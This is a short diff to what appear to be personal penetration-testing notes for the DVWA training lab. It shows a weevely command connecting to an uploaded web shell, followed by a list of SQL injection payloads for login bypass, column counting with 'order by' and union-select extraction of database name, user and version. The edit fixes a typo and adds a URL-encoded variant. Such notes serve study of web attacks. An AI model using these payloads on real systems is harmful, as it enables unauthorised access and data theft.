@@ -120,9 +120,10 @@ weevely http://192.168.136.131/dvwa/hackable/uploads/shell.php 123456
 
 #SQL
 [+] 123456' and 1=1# -- Executing SQL command with login pass/ setting condition to TRUE	
-[+} passs' 0r 1=1# -- Conditioning database with TRUE SQL statement and wrong pass
+[+} passs' or 1=1# -- Conditioning database with TRUE SQL statement and wrong pass
 [+] admin' # ---- code execution for username side to exclude correct pass
 [+] inject SQL in url tab if there is no login form to discover if server takes SQL
+[+] "'; or 1=1#" --encode in URL
 [+] ' order by 1%23 -- order result
 [+] {' union select 1,2,3,4,5%23}/{' union select 1,database(),user(),version(),5%23} -- to specify SQL data
 - union select 1,database(),user(),version(),5%23 ---dispaly other table set
